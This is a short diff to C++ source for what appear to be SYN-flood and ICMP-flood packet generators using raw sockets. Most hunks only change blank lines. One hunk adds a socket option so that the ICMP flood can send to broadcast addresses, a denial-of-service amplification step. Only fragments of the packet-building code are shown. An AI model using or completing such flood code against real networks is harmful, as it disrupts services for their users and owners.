@@ -142,11 +142,11 @@ void SynFlood::generate()
     syn_options_.windowScale.length=3;
     syn_options_.windowScale.shifCount=7;
 
-
     sockaddr_in dst_addr;
     dst_addr.sin_family=AF_INET;
     dst_addr.sin_addr.s_addr=iph_.daddr;
     dst_addr.sin_port = tcph_.dest;
+
 
     struct iphdr * iph = (struct iphdr *)packet;
 
@@ -192,6 +192,7 @@ void IcmpFlood::generate()
     iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN);
     //make packet buf
     uint8_t packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN];
+
     memset(data,6,ICMP_DATA_LEN);
     sockaddr_in dst_addr;
     dst_addr.sin_family=AF_INET;
@@ -202,6 +203,9 @@ void IcmpFlood::generate()
     memcpy(packet + sizeof(struct iphdr),&icmph_,sizeof(struct icmphdr));
     memcpy(packet+ sizeof(struct iphdr) + sizeof(struct icmphdr),data,ICMP_DATA_LEN);
 
+    //set socket for send broadcast
+    int broadcast = 1;
+    setsockopt(raw_fd_,SOL_SOCKET,SO_BROADCAST,&broadcast,sizeof(broadcast));
 
     struct iphdr * iph = (struct iphdr *)packet;
     calIPChecksum((uint8_t*)iph);
